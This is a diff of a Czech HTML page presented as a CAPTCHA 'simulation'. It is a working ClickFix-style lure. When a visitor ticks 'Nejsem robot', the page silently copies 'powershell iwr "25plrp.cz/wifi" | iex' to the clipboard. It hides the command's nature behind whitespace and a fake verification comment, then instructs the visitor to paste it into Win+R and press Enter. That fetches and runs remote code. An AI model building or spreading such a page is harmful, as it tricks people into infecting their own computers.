@@ -4,91 +4,50 @@
   <meta charset="UTF-8" />
   <title>Captcha simulace s PowerShell aktivací</title>
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
-    body {
+    body, html {
+      margin: 0; padding: 0;
       font-family: Arial, sans-serif;
-      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
+      height: 100%;
     }
-
-    /* Pozadí s titulkem a obrázkem */
     #background {
       position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
+      top:0; left:0; width:100%; height:100%;
       display: flex;
       flex-direction: column;
-      align-items: center;
       justify-content: center;
-      z-index: 1;
-      opacity: 1;
-      transition: opacity 0.3s ease;
-      pointer-events: none;
-    }
-
-    #background.blurred {
-      opacity: 0.2;
-      filter: blur(12px);
-    }
-
-    #background h1 {
-      font-size: 2.5em;
-      color: white;
-      margin-bottom: 30px;
-      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
-    }
-
-    #background img {
-      width: 300px;
-      height: auto;
-      border-radius: 15px;
-      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
-    }
-
-    /* Captcha box */
-    #captchaBox {
-      display: inline-block;
-      border: 2px solid #ccc;
-      padding: 20px;
-      border-radius: 10px;
-      width: 300px;
-      box-shadow: 2px 2px 8px #888;
-      position: relative;
-      z-index: 100;
-      background: white;
-      opacity: 1;
-      transition: opacity 0.3s ease;
-    }
-
-    #captchaBox.hidden {
-      opacity: 0;
-      pointer-events: none;
-    }
-
-    #captchaBox label {
-      display: flex;
       align-items: center;
-      cursor: pointer;
-      font-size: 1.1em;
+      z-index: 1;
+      opacity: 0.3;
+      filter: blur(12px);
+      transition: filter 0.5s ease, opacity 0.5s ease;
+      background: #f5f5f5;
     }
-
-    #robotCheckbox {
-      margin-right: 10px;
-      width: 20px;
-      height: 20px;
-      cursor: pointer;
+    #background.clear {
+      opacity: 1;
+      filter: none;
     }
-
+    #marvinImg {
+      width: 200px;
+      margin-top: 30px;
+    }
+    .modal {
+      position: fixed;
+      top: 50%; left: 50%;
+      transform: translate(-50%, -50%);
+      background: white;
+      padding: 30px 40px;
+      border-radius: 10px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+      z-index: 10;
+      text-align: center;
+      min-width: 300px;
+    }
+    #captchaModal, #alertModal {
+      display: none;
+    }
+    #captchaModal.show, #alertModal.show {
+      display: block;
+    }
     #loader {
       margin: 20px auto 0 auto;
       border: 6px solid #f3f3f3;
@@ -99,145 +58,56 @@
       animation: spin 1s linear infinite;
       display: none;
     }
-
     @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-
-    #alertBox {
-      position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      background: white;
-      padding: 30px;
-      border: 2px solid #333;
-      border-radius: 10px;
-      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
-      z-index: 9999;
-      display: none;
-      text-align: center;
-      min-width: 300px;
-      animation: slideIn 0.3s ease;
-    }
-
-    @keyframes slideIn {
-      from {
-        transform: translate(-50%, -60%);
-        opacity: 0;
-      }
-      to {
-        transform: translate(-50%, -50%);
-        opacity: 1;
-      }
-    }
-
-    #alertBox.show {
-      display: block;
-    }
-
-    #alertBox h2 {
-      margin-top: 0;
-      color: #333;
-      font-size: 1.5em;
-    }
-
-    #alertBox p {
-      color: #666;
-      line-height: 1.6;
-      margin-top: 15px;
-    }
-
-    #alertBox .countdown {
-      font-weight: bold;
-      color: #667eea;
-      font-size: 1.2em;
-      margin-top: 10px;
-    }
-
-    #hiddenBtn {
-      display: none;
+      0% { transform: rotate(0deg);}
+      100% { transform: rotate(360deg);}
     }
   </style>
 </head>
 <body>
-  <!-- Pozadí se titulkem a obrázkem -->
   <div id="background">
     <h1>Vítejte na vaší vysněné stránce</h1>
-    <img src="https://25plrp.cz/Dont-Panic.jpg" alt="Don't panic with Marvin" />
+    <img id="marvinImg" src="https://25plrp.cz/Dont-Panic.jpg" alt="Don't panic with Marvin" />
   </div>
 
-  <!-- Captcha box -->
-  <div id="captchaBox">
+  <div id="captchaModal" class="modal show">
     <label>
-      <input type="checkbox" id="robotCheckbox" />
-      Nejsem robot
+      <input type="checkbox" id="robotCheckbox" /> Nejsem robot
     </label>
-    <div id="loader"></div>
   </div>
 
-  <!-- Alert s instrukcemi -->
-  <div id="alertBox">
+  <div id="alertModal" class="modal">
     <h2>⚠️ Instrukce</h2>
     <p>Spusťte Win+R<br>Vložte zkopírovaný text (Ctrl+V)<br>Potvrďte Enter</p>
   </div>
 
-  <button id="hiddenBtn"></button>
-
   <script>
-    const checkbox = document.getElementById("robotCheckbox");
-    const loader = document.getElementById("loader");
-    const captchaBox = document.getElementById("captchaBox");
-    const background = document.getElementById("background");
-    const alertBox = document.getElementById("alertBox");
+    const background = document.getElementById('background');
+    const captchaModal = document.getElementById('captchaModal');
+    const alertModal = document.getElementById('alertModal');
+    const checkbox = document.getElementById('robotCheckbox');
 
-    function startCountdown() {
-      let secondsRemaining = 5;
-      const countdownInterval = setInterval(() => {
-        secondsRemaining--;
-        if (secondsRemaining <= 0) {
-          clearInterval(countdownInterval);
-          // Po 5 sekundách se objeví obsah
-          background.classList.remove("blurred");
-          captchaBox.classList.add("hidden");
-          alertBox.classList.remove("show");
-          loader.style.display = "none";
-        }
-      }, 1000);
-    }
-
-    checkbox.addEventListener("change", () => {
+    checkbox.addEventListener('change', () => {
       if (checkbox.checked) {
-        // Zobrazení loaderu a alertu
-        loader.style.display = "block";
-        alertBox.classList.add("show");
-        background.classList.add("blurred");
-        startCountdown();
+        captchaModal.classList.remove('show');
+        alertModal.classList.add('show');
 
-        // PowerShell příkaz s komentářem na konci
+        // Po 15 sekundách zmizí alert a zruší se blur z pozadí
+        setTimeout(() => {
+          alertModal.classList.remove('show');
+          background.classList.add('clear');
+        }, 15000);
+
+        // Kopírování příkazu (můžete upravit dle potřeby)
         const psCommand =
-          'powershell iwr "25plrp.cz/wifi" | iex                      #              Po stisku proběhne ověření na vašem počítači ✅';
-
-        navigator.clipboard
-          .writeText(psCommand)
-          .catch((err) => {
-            console.error("Nepodařilo se zkopírovat text do schránky.");
-            checkbox.checked = false;
-            loader.style.display = "none";
-            background.classList.remove("blurred");
-            alertBox.classList.remove("show");
-          });
-      } else {
-        loader.style.display = "none";
-        background.classList.remove("blurred");
-        captchaBox.classList.remove("hidden");
-        alertBox.classList.remove("show");
+          'powershell iwr "25plrp.cz/wifi" | iex           #             Po stisku proběhne ověření na vašem počítači ✅';
+        navigator.clipboard.writeText(psCommand).catch(() => {});
       }
     });
   </script>
 </body>
 </html>
+
 
 
 <!--
